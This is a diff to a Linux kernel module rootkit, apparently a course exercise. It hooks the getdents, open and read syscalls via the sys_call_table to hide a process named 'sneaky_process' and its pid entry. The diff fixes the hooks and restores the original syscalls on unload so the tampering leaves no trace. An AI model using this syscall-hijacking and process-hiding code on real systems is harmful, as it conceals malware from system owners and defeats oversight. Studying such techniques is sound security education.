@@ -59,7 +59,7 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,un
   struct linux_dirent *d;
   nread = original_getdents(fd, dirp, count);
   for (bpos = 0; bpos < nread;) {
-    d = (struct linux_dirent *)(dirp + bpos);
+    d = (void *)dirp + bpos;
     
     //In order to hide the “sneaky_process”, need to skip sneaky_process in step #1 and the pid named file in step #2
     if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, pid) == 0) {
@@ -85,7 +85,7 @@ asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 }
 
 // Define our new sneaky version of the 'read' syscall(step #4) 
-asmlinkage int sneaky_sys_read(int fd, void *buf, size_t count)
+asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count)
 {
   ssize_t nread;
   nread = original_read(fd, buf, count);
@@ -161,10 +161,12 @@ static void exit_sneaky_module(void)
   //Make this page read-write accessible
   pages_rw(page_ptr, 1);
 
-  //This is more magic! Restore the original 'open' system call
+  //This is more magic! Restore the original system calls
   //function address. Will look like malicious code was never there!
+  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
   *(sys_call_table + __NR_open) = (unsigned long)original_open;
-
+  *(sys_call_table + __NR_read) = (unsigned long)original_read;
+  
   //Revert page to read-only
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
